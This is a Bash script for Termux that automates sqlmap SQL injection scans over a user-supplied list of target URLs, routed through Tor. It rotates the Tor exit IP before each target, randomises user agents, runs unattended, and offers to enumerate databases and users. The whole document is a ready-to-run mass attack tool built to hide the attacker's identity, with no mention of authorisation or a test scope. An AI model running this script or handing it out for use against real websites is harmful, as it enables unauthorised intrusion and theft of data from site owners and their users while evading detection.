#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${GREEN}🛡️ SQLMap via Tor Auto-Runner v3.0 with IP Rotation, Auto-Loop & Logging${RESET}"

# Check if Tor is running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor is already running${RESET}"
fi

# Ask for URL list
read -p "📁 Enter path to URL list file (one URL per line): " url_file
if [[ ! -f "$url_file" ]]; then
    echo -e "${RED}[!] File not found: $url_file${RESET}"
    exit 1
fi

# Optional extra SQLMap flags
read -p "⚙️  Extra SQLMap options (e.g. --dbs --users): " extra_options

mkdir -p logs

total=$(grep -cve '^\s*$' "$url_file")
count=0

# Function: Get current Tor IP
get_tor_ip() {
    torsocks curl -s --max-time 8 https://ifconfig.me || echo "Tor IP Fetch Failed"
}

# Function: Request new Tor identity (needs ControlPort enabled)
rotate_tor_ip() {
    (echo authenticate \"\"; echo signal NEWNYM; echo quit) | nc 127.0.0.1 9051 > /dev/null 2>&1
    sleep 5
}

# Loop
while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    count=$((count+1))

    echo -e "\n${YELLOW}[${count}/${total}]🔍 Target: $url${RESET}"

    # Log name
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    # Tor IP before
    ip_before=$(get_tor_ip)
    echo -e "➡️  Tor IP before: ${BLUE}${ip_before}${RESET}"

    # Timer Start
    start_time=$(date +%s)

    # Launch SQLMap via torsocks
    echo -e "${BLUE}🚀 Launching SQLMap...${RESET}"
    torsocks timeout 180s python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent \
        --delay=3 \
        --timeout=30 \
        --retries=2 \
        --batch \
        --output-dir=logs/sqlmap_output \
        $extra_options 2>&1 | tee "$log_file"

    exit_code=$?
    end_time=$(date +%s)
    duration=$((end_time - start_time))

    # Check execution
    if [[ $exit_code -eq 0 ]] && grep -q "\[INFO\]" "$log_file"; then
        echo -e "${GREEN}✓ SQLMap scan completed${RESET}"
    else
        echo -e "${RED}✗ Skipped due to error or timeout${RESET}"
    fi

    # Tor IP after
    ip_after=$(get_tor_ip)
    echo -e "⬅️  Tor IP after: ${BLUE}${ip_after}${RESET}"

    echo -e "📝 Log saved: ${log_file}"
    echo "-----------------------------------------------"

    # Rotate IP for next target
    echo -e "${YELLOW}🔁 Rotating Tor IP...${RESET}"
    rotate_tor_ip

    # Delay based on scan duration (min 5s)
    delay=$((duration < 5 ? 5 : duration))
    echo -e "${YELLOW}⏱️  Sleeping for $delay seconds before next scan...${RESET}"
    sleep $delay

done < "$url_file"

echo -e "${GREEN}✅ All scans complete. Check logs/sqlmap_output/* and logs/*.log${RESET}"
